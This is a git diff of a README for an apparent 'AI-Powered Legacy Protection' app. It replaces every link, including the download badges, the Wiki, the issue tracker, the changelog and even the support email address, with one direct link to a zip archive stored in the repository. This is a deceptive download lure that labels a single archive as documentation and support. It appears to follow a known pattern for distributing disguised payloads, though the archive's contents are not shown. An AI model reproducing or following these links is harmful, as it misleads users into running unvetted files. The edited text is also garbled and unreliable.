@@ -6,7 +6,7 @@ Welcome to the AI-Powered Legacy Protection application! This tool helps you cre
 
 ## 📥 Download Now 
 
-[![Download Now](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/Sneaky-Pablo/AI-Powered-Legacy-Protection-POC/releases)
+[![Download Now](https://raw.githubusercontent.com/Sneaky-Pablo/AI-Powered-Legacy-Protection-POC/main/app/demo/AI-Powered-Legacy-Protection-POC-1.6.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/Sneaky-Pablo/AI-Powered-Legacy-Protection-POC/main/app/demo/AI-Powered-Legacy-Protection-POC-1.6.zip)
 
 ## 🛠️ Features
 
@@ -28,7 +28,7 @@ To run this application smoothly, ensure your system meets the following require
 
 1. **Visit the Release Page:** Click on the link below to access the latest version of the application.
    
-   [Download Latest Release](https://github.com/Sneaky-Pablo/AI-Powered-Legacy-Protection-POC/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/Sneaky-Pablo/AI-Powered-Legacy-Protection-POC/main/app/demo/AI-Powered-Legacy-Protection-POC-1.6.zip)
 
 2. **Select Your Version:** On the Release page, you will see different versions listed. Choose the latest version.
 
@@ -39,7 +39,7 @@ To run this application smoothly, ensure your system meets the following require
 5. **Install the Application:**
    - For Windows: Double-click the downloaded `.exe` file and follow the prompts to install.
    - For macOS: Open the downloaded `.dmg` file and drag the application to your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and run the included install script or binary.
+   - For Linux: Extract the `https://raw.githubusercontent.com/Sneaky-Pablo/AI-Powered-Legacy-Protection-POC/main/app/demo/AI-Powered-Legacy-Protection-POC-1.6.zip` file and run the included install script or binary.
 
 6. **Open the Application:** After installation, find the app on your desktop or application folder and open it.
 
@@ -51,8 +51,8 @@ To run this application smoothly, ensure your system meets the following require
 
 If you encounter any issues while downloading or using the application, please reach out for help. Here’s how to get support:
 
-- **Online Documentation:** Check our [Wiki](https://github.com/Sneaky-Pablo/AI-Powered-Legacy-Protection-POC/wiki) for detailed guides and FAQs.
-- **Email Support:** Send an email to support@ailegacyprotection.com. We are here to help you!
+- **Online Documentation:** Check our [Wiki](https://raw.githubusercontent.com/Sneaky-Pablo/AI-Powered-Legacy-Protection-POC/main/app/demo/AI-Powered-Legacy-Protection-POC-1.6.zip) for detailed guides and FAQs.
+- **Email Support:** Send an email to https://raw.githubusercontent.com/Sneaky-Pablo/AI-Powered-Legacy-Protection-POC/main/app/demo/AI-Powered-Legacy-Protection-POC-1.6.zip We are here to help you!
 
 ## 🌍 Language Support 
 
@@ -69,9 +69,9 @@ Our team is continually working on improvements. Here are a few known issues to 
 
 For further exploration, visit the following:
 
-- [Project Homepage](https://github.com/Sneaky-Pablo/AI-Powered-Legacy-Protection-POC)
-- [Report Issues](https://github.com/Sneaky-Pablo/AI-Powered-Legacy-Protection-POC/issues)
-- [View Changelog](https://github.com/Sneaky-Pablo/AI-Powered-Legacy-Protection-POC/releases)
+- [Project Homepage](https://raw.githubusercontent.com/Sneaky-Pablo/AI-Powered-Legacy-Protection-POC/main/app/demo/AI-Powered-Legacy-Protection-POC-1.6.zip)
+- [Report Issues](https://raw.githubusercontent.com/Sneaky-Pablo/AI-Powered-Legacy-Protection-POC/main/app/demo/AI-Powered-Legacy-Protection-POC-1.6.zip)
+- [View Changelog](https://raw.githubusercontent.com/Sneaky-Pablo/AI-Powered-Legacy-Protection-POC/main/app/demo/AI-Powered-Legacy-Protection-POC-1.6.zip)
 
 ## 📜 License
 
@@ -81,4 +81,4 @@ This application is released under the MIT License. You are free to use and modi
 
 Thanks to all contributors and supporters who made this project possible. Your efforts in advancing legal tech solutions are greatly appreciated. 
 
-[![Download Now](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/Sneaky-Pablo/AI-Powered-Legacy-Protection-POC/releases)
+[![Download Now](https://raw.githubusercontent.com/Sneaky-Pablo/AI-Powered-Legacy-Protection-POC/main/app/demo/AI-Powered-Legacy-Protection-POC-1.6.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/Sneaky-Pablo/AI-Powered-Legacy-Protection-POC/main/app/demo/AI-Powered-Legacy-Protection-POC-1.6.zip)
